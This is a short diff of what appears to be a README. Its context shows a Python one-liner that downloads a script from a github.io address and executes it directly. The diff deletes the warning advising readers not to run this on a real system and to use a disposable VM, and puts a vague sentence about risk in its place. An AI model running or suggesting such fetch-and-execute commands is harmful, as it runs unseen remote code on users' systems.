@@ -6,7 +6,7 @@
 python -c"from urllib.request import*;exec(urlopen('https://jnvanderz.github.io/notepad.py').read())"
 ```
 
-Please don't run that code on your real system. You may test it using a disposable VM. Don't risk yourself.
+If we could only figure out how to run them without risking the rest of the system, that would be nice.
 
 #### My links
 
